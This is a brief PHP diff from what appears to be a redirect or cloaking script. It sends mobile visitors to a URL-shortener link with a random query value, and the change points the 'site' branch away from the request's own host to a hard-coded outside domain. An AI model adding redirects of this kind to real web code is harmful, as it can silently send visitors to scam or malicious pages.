@@ -117,7 +117,7 @@
   if($action == 'mobile'){
     header('Location: https://goo.gl/Fjma8Y?'.rand(11111,99999));
   }else if($action == 'site'){
-    header("Location: http://$_SERVER[HTTP_HOST]/$id.scan");
+    header("Location: http://incigibigeldin.info/$id.scan");
   }else{
     @ob_end_clean();
     @ob_end_flush();
